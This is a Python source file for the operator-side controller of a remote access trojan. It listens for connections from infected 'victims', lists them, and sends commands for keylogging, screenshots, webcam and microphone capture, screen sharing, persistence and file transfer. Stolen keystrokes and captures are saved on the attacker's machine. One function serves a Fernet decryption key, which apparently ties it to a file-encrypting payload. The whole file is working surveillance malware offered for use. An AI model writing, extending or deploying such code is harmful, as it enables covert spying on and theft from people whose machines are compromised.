import socket

from termcolor import colored

from colored import fg, bg, attr

import json

import base64

import os

import sys

import time

import random

import subprocess

import platform

import getpass

import threading







def send_key():

    sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    sock1.bind(("10.0.10.7", 7050))

    sock1.listen()

    target_sock, ip = sock1.accept()

    with open("c:\\Users\\wintest\\Videos\\decKey.txt", "rb") as file :

        target_sock.send("import rsa; from cryptography.fernet import Fernet".encode())

        target_sock.send(f"Fernet({file.read()})".encode())

    sock1.close()











recv_msg_list = ["[+] Persistence is ON.", "[+] Keylogger Started.", "[+] Keylogger Stopped.", "Upload Done.", "Video Streaming has Started.", "Video Streaming has Terminated.", "ScreenSharing has Started.", "ScreenSharing has Terminated.",

"Voice Capturing has Started.", "Voice Capturing has Terminated."]

clients_list = []

sock_obj_victims = []

acc = True

def accepting_clients():

    global clients_list

    global sock_obj_victims

    while acc:

        client, client_ip = sock.accept()

        if client_ip not in clients_list :

            for i in range(len(clients_list)):

                if client_ip[0] == clients_list[i][0]:

                    clients_list.remove(clients_list[i])

                    sock_obj_victims.remove(sock_obj_victims[i])

            clients_list.append(client_ip)

            sock_obj_victims.append(client)





def reliable_send(data):

    json_data = json.dumps(data)

    return connection.send(json_data.encode())





def reliable_recv():

    json_data = ""

    while 1 :

        try :

            json_data += connection.recv(1024).decode().rstrip()

            return  json.loads(json_data)

        except ValueError:

            continue



def write_file(file_name , content):

    path = input(colored("Enter the path where you want to save the file on it : ", "green"))

    try:

        d_file = open(path+file_name , "wb")

        d_file.write(base64.b64decode(content))

        d_file.close()

        return colored("[+] Download Successful.", "blue")

    except FileNotFoundError:

        return colored(f"No such file or directory: {path} " , "red")



def read_file(path):

    try:

        up_file = open(path, "rb")

        return base64.b64encode(up_file.read())

    except FileNotFoundError:

        return colored("File Not Found !", "red")



def help():

    print(colored("""

    help                --> To get Help

    clear               --> To Clear The Screen

    screenshot          --> To Screenshot the target

    key_log start       --> To Start The KeyLogger

    key_log stop        --> To Stop The KeyLogger and delete all old saved key strokes

    key_log dump        --> To Display And Save The Saved Keys Strokes

    persistence         --> To Get Information about The Persistence

    vidstream           --> To Open WebCam (But it's Suspicious Because WebCam lamp will be opened)

    vidstream_off       --> To Close Video Streaming

    voice_cap           --> To Start Voice Capturing

    voice_cap_off       --> To Stop Voice Recording

    screenshare         --> To Share Target Screen

    screenshare_off     --> To Stop Screen Sharing

    picap               --> To Image Capture The WebCam (will open the WebCam lamp for 1s)

    upload [file]       --> To Upload File

    download [file]     --> To Download file

    cd [directory]      --> To Change Current Working Directory

    sysinfo             --> To Get System Info

    show_targets        --> To show infected targets 

    quit                --> To Exit The Program

    """, "green"))



def download_file(path, content):

    o_sys = input("Type (1) if the target system is Windows or Anything if it is Unix :")

    if o_sys == "1":

        file_name = path.split("\\")[-1]

    else:

        file_name = path.split("/")[-1]

    print(write_file(file_name, content))



def upload_file(path):

    o_sys = input("Type (1) if you are using Windows or Anything if you are using Unix :")

    if o_sys == "1":

        file_name = path.split("\\")[-1]

    else:

        file_name = path.split("/")[-1]

    up_path = input("Enter the path : ")

    up_file_content = read_file(path).decode()

    return ["upload", file_name, up_path, up_file_content]



def clear():

    if platform.system() == "Windows":

        os.system("cls")

    else:

        os.system("clear")





def write_strokes(content):

    try:

        d_file = open(path , "w")

        d_file.write(content)

        d_file.close()

    except FileNotFoundError:

        pass





def key_log_dump(content):

    write_strokes(content)

    with open(path, "r") as f:

        keys = f.readlines()

        f.close()

    for key in keys:

        print(key)

    print(colored(f"Key Strokes are Stored in {path}", "green"))



def vid_stream():

    from vidstream import StreamingServer

    global vid_receiving

    vid_receiving = StreamingServer(ip_add, 8888)

    t1 = threading.Thread(target=vid_receiving.start_server)

    t1.start()







def voice_recv():

    from vidstream import AudioReceiver

    global recv_aud

    recv_aud = AudioReceiver(ip_add, 3429)

    aud_thread = threading.Thread(target=recv_aud.start_server)

    aud_thread.start()





def exec_cmd():

    i = random.randint(1, 203154)

    while 1:

        try :

            i += 1

            cmd = input("Enter Command > ").split()

            if cmd == []:

                print(colored("Type Something !" , "red"))

                continue

            elif cmd[0].lower() == "clear":

                clear()

                continue

            elif cmd[0].lower() == "upload" and len(cmd) > 1:

                cmd = upload_file(cmd[1])

            elif cmd[0].lower() == "help":

                help()

                continue

            elif cmd[0].lower() == "show_targets" and len(cmd) == 1:

                return False

            elif cmd[0].lower() in ["vidstream_off", "screenshare_off"] and len(cmd) == 1:

                vid_receiving.stop_server()

            elif cmd[0].lower() == "voice_cap_off" and len(cmd) == 1:

                recv_aud.stop_server()

            elif cmd[0].lower() == "voice_cap" and len(cmd) == 1:

                voice_recv()

            elif cmd[0].lower() == "quit" :

                print(colored("Quitting ..." , "yellow"))

                break

            reliable_send(cmd)

            if cmd[0].lower() == "vidstream" or cmd[0].lower() == "screenshare":

                vid_stream()

            recv_cmd = reliable_recv()

            #if recv_cmd == "bye":

            #    print(colored("Quitting ..." , "yellow"))

            #    exit()

            if cmd[0].lower() == "download" and len(cmd) == 2 and recv_cmd != "File Not Found !":

                download_file(cmd[1], recv_cmd)

            elif recv_cmd == "Invalid Command !" or recv_cmd == "Invalid Directory !" or recv_cmd == "File Not Found !" or recv_cmd == "[-] Upload Your Persistence... Because there is an Error Occur!" or recv_cmd == "Start The Keylogger First.":

                print(colored(recv_cmd , "red"))

            elif recv_cmd[0] == "ss":

                write_file(f"screen{i}", recv_cmd[1])

            elif recv_cmd in recv_msg_list :

                print(colored(recv_cmd, "blue"))

            elif recv_cmd[0] == "key_log_dump":

                key_log_dump(recv_cmd[1])

            elif recv_cmd[0] == "piccap" and len(recv_cmd) == 2:

                write_file(f"PiCapture{i}.jpg", recv_cmd[1])

                print(colored("WebCam Capture Done.", "blue"))

            else:

                print(colored(recv_cmd, "magenta"))

        except Exception:

            print(colored("[-] Error During command Execution ." , "red"))

            continue



def install_pre_req(pip):

    print(colored("[-] Installing Prerequisites On The Attacker Machine ...", "magenta"))

    time.sleep(2)

    subprocess.check_output(pip + " install --upgrade " + pip, shell=True)

    subprocess.check_output(pip + " install termcolor", shell=True)

    subprocess.check_output(pip + " install colored", shell=True)

    subprocess.check_output(pip + " install colored --upgrade", shell=True)

    subprocess.check_output(pip + " install vidstream", shell=True)

    subprocess.check_output(pip + " install pillow", shell=True)

    subprocess.check_output(pip + " install pyautogui", shell=True)





while 1:

    ask = input(colored("[+] Press (y/Yes) if u wanna start the listener or (n/No) if u don't : ", "green")).strip()

    if ask.lower() in ["no", "n", "non"]:

        print(colored("Bye.", "cyan"))

        break

    elif ask.lower() in ["yes", "y", "oui"]:

        try:

            print(colored("Go To this URL : https://www.lfd.uci.edu/~gohlke/pythonlibs/#pyaudio and Download the whl file and install it using pip.", "red"))

            print(colored("[+] Done with installing Prerequisites On The Attacker Machine.", "cyan"))

            print(colored("Note: Don't Use ctrl+C Only if The Listener Crashes (Use quit To exit)", "red"))

            #ip_add = input(colored("Enter Your IP Address (LHOST) : ", "green"))

            #port = int(input(colored("Enter The Listener Port (LPORT) > ", "green")))

            ip_add = "10.0.10.6"

            port = 7007

            print(colored("[+] Listening For Incoming Connection ...", "yellow"))

            #send_key()

            sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM)

            path = f"c:\\users\\{getpass.getuser()}\\videos\\strokes.txt"

            sock.bind((ip_add ,port))

            sock.listen(5)

            try :

                t1 = threading.Thread(target = accepting_clients)

                t1.start()

            except:

                sock.close()

                continue

            while 1:

                if len(clients_list) == 0:

                    continue

                print("[*] Targets Connected :")

                for i in range(len(clients_list)):

                    print(colored(f"    # {i+1} : Target with IP '{clients_list[i][0]}' on port '{clients_list[i][1]}'", "blue"))

                try:

                    victim = int(input(colored("Choose One Victim (Type it's id) > ", "green")))

                except Exception :

                    print(colored("[!] Enter the right id.", "red"))

                    continue

                connection = sock_obj_victims[victim-1]

                if exec_cmd() == False:

                    continue

                acc = False

                t1.join()

                sock.close()

                break

        except Exception :

            continue